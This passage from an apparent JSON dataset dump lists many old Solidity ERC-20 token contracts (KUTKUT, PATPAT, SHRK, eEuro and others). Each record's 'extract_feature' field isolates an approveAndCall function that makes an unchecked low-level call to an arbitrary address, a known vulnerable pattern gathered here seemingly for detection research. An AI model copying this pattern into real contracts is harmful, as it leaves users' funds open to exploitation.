(uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract KUTKUT is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = '1.0';\n function KUTKUT(\n ) {\n balances[msg.sender] = 20000000000;\n totalSupply = 20000000000;\n name = \"KUTKUT\";\n decimals = 2;\n symbol = \"KUTKUT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb149c"
  },
  "filename": "32053.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract PATPAT is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = '1.0';\n function PATPAT(\n ) {\n balances[msg.sender] = 200000000;\n totalSupply = 200000000;\n name = \"PATPAT\";\n decimals = 2;\n symbol = \"PATPAT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb149d"
  },
  "filename": "32054.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token{\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns\n (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns\n (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256\n _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns\n (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success)\n {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract SixDomainAsset is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'v0.1';\n string public officialWebsite = 'https:\n function SixDomainAsset(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n totalSupply = _initialAmount * 10 ** uint256(_decimalUnits);\n balances[msg.sender] = totalSupply;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb149e"
  },
  "filename": "32072.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract GBIT is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function GBIT(\n ) {\n balances[msg.sender] = 500000000;\n totalSupply = 500000000;\n name = \"GBIT\";\n decimals = 2;\n symbol = \"GBT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb149f"
  },
  "filename": "32077.sol",
  "content": "pragma solidity ^0.4.15;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract TeamSharksToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract SHRK is TeamSharksToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function SHRK(\n ) {\n balances[msg.sender] = 100000000000000000000000000;\n totalSupply = 100000000000000000000000000;\n name = \"Shark Coin\";\n decimals = 18;\n symbol = \"SHRK\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb14a0"
  },
  "filename": "32137.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract KLANCER is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function KLANCER(\n ) {\n balances[msg.sender] = 100000000000000000000000000;\n totalSupply = 100000000000000000000000000;\n name = \"KLANCER\";\n decimals = 18;\n symbol = \"KLC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb14a1"
  },
  "filename": "32151.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract BossToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function BossToken(\n ) {\n balances[msg.sender] = 30000000000000000000000000;\n totalSupply = 30000000000000000000000000;\n name = \"BossToken\";\n decimals = 18;\n symbol = \"BOSS\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb14a2"
  },
  "filename": "32157.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000000000000000;\n totalSupply = 10000000000000000000;\n name = \"Dogecoin Dark\";\n decimals = 8;\n symbol = \"DOGED\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb14a3"
  },
  "filename": "32188.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract KuaiCoin is StandardToken {\n function () {\n throw;\n }\n string public name = 'Kuai Coin';\n uint8 public decimals;\n string public symbol = 'KKC';\n string public version = 'H1.0';\n function KuaiCoin(\n ) {\n balances[msg.sender] = 15000000000;\n totalSupply = 15000000000;\n name = \"Kuai Coin\";\n decimals = 0;\n symbol = \"KKC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb14a4"
  },
  "filename": "32216.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract SIGNAL is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function SIGNAL(\n ) {\n balances[msg.sender] = 5000000000000000;\n totalSupply = 5000000000000000;\n name = \"SIGNAL\";\n decimals = 8;\n symbol = \"SIG\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb14a5"
  },
  "filename": "32219.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract eEuro is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function eEuro(\n ) {\n balances[msg.sender] = 510000000000000000000000000;\n totalSupply = 510000000000000000000000000;\n name = \"eEuro\";\n decimals = 18;\n symbol = \"eEUR\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb14a6"
  },
  "filename": "32220.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n uint256 constant MAX_UINT256 = 2**256 - 1;\n function transfer(address _to, uint256 _value) public returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n uint256 allowance = allowed[_from][msg.sender];\n require(balances[_from] >= _value && allowance >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT256) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant public returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) public {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb14a7"
  },
